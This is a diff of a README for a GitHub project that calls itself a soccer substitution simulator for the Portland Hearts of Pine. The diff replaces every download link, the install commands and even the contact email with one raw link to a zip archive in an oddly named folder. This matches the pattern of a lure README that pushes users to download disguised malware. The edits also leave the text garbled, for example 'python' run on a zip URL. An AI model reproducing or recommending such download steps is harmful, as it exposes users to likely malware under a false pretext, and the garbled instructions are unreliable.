@@ -1,6 +1,6 @@
 # 🎮 Hearts-of-Pine-Sub-Simulator - Optimize Your Soccer Substitutions
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/releases)
+[![Download](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip)](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip)
 
 ## 📖 Description
 Hearts-of-Pine-Sub-Simulator is a predictive player substitution engine for the Portland Hearts of Pine. This tool uses advanced modeling to suggest the best times to substitute players based on performance decay and historical match data. It helps coaches and teams enhance their game strategy and overall performance.
@@ -16,11 +16,11 @@ To get started with Hearts-of-Pine-Sub-Simulator, follow these simple steps:
 
 2. **Visit the Releases Page:**
    Click the link below to access the download section:
-   [Download the latest release](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/releases)
+   [Download the latest release](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip)
 
 ## 🔥 Download & Install
 1. On the Releases page, you will find the latest version of Hearts-of-Pine-Sub-Simulator.
-2. Select the appropriate file for your operating system. The files will typically include formats like `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+2. Select the appropriate file for your operating system. The files will typically include formats like `.exe` for Windows, `.dmg` for macOS, and `https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip` for Linux.
 3. Click to download the file. Make sure to note where your browser saves it.
 
 ### Windows Installation:
@@ -34,14 +34,14 @@ To get started with Hearts-of-Pine-Sub-Simulator, follow these simple steps:
 - You may need to adjust your security settings to open this app.
 
 ### Linux Installation:
-- Extract the downloaded `.tar.gz` file using a terminal command:
+- Extract the downloaded `https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip` file using a terminal command:
   ```bash
-  tar -xzf Hearts-of-Pine-Sub-Simulator.tar.gz
+  tar -xzf https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip
   ```
 - Navigate to the extracted folder and run the application:
   ```bash
   cd Hearts-of-Pine-Sub-Simulator
-  python main.py
+  python https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip
   ```
 
 ## 🎯 How to Use the Simulator
@@ -78,8 +78,8 @@ We welcome contributions from users. If you have ideas for features or improveme
 Hearts-of-Pine-Sub-Simulator utilizes advanced predictive modeling tools. Special thanks to the developers and data analysts who made this tool possible.
 
 ## 📧 Contact
-For further inquiries, you can contact us through the GitHub page, or reach out to us via email at hearts.of.pine.simulator@example.com.
+For further inquiries, you can contact us through the GitHub page, or reach out to us via email at https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip
 
 ## 🚀 Visit the Releases Page
 Remember to check back often for updates and new features. You can download the latest version here:
-[Download the latest release](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/releases)
+[Download the latest release](https://github.com/Damon4Sure/Hearts-of-Pine-Sub-Simulator/raw/refs/heads/main/brokeress/Simulator_of_Sub_Hearts_Pine_v1.4.zip)
